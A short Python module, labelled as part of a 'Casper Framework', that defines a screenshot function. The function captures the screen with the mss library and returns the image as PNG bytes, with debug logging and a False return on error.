'''
Part of Casper Framework
'''
from includes import *

def screenshot():
	try:
		with mss.mss() as screen:
			logging.debug('[casper] Getting monitors')
			im = screen.grab(screen.monitors[1-1])
			
			logging.debug('[casper] Reading image raw_bytes')
			raw_bytes = mss.tools.to_png(im.rgb, im.size)
			
			logging.debug('[casper] Successfully read image raw_bytes')
			return raw_bytes
	except Exception as e:
		logging.debug('[casper] Error saving screenshot')
		return False